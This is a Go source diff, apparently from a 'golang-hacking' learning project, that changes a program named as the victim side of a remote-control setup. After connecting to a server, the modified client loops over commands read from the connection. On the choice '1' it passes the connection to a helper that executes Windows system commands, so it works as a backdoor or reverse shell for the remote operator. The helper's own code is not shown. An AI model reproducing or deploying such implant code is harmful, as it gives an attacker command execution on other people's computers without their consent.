@@ -1,16 +1,24 @@
 package main
 
 import (
-	"encoding/gob"
+	"bufio"
 	"fmt"
+	"golang-hacking/VictimFinalVersion/core/ExecuteSystemCommandWindows"
 	"golang-hacking/VictimFinalVersion/core/handleConnection"
 	"log"
+	"strings"
 )
 
 type Data struct {
 	Name string
 	ID   int
 	Age  float32
+}
+
+func DisplayError(err error) {
+	if err != nil {
+		fmt.Println(err)
+	}
 }
 
 func main() {
@@ -24,18 +32,30 @@ func main() {
 	defer connection.Close()
 	fmt.Println("[+] Connection established with Server :", connection.RemoteAddr().String())
 
-	decoder := gob.NewDecoder(connection)
+	reader := bufio.NewReader(connection)
 
-	data := &Data{}
+	loopControl := true
 
-	err = decoder.Decode(data)
+	for loopControl {
 
-	if err != nil {
-		log.Fatal(err)
-	} else {
-		fmt.Println("[+] Successfully decoded data")
-		fmt.Println(data.Name)
-		fmt.Println(data.Age)
-		fmt.Println(data.ID)
+		user_input_raw, err := reader.ReadString('\n')
+		if err != nil {
+			fmt.Println(err)
+			continue
+		}
+
+		user_input := strings.TrimSuffix(user_input_raw, "\n")
+
+		switch {
+		case user_input == "1":
+			fmt.Println("[+] Executing Commands on windows")
+			err := ExecuteSystemCommandWindows.ExecCommandWindows(connection)
+			DisplayError(err)
+		case user_input == "99":
+			fmt.Println("[-] Exiting the windows program")
+			loopControl = false
+		default:
+			fmt.Println("[-] Invalid input, try again")
+		}
 	}
 }
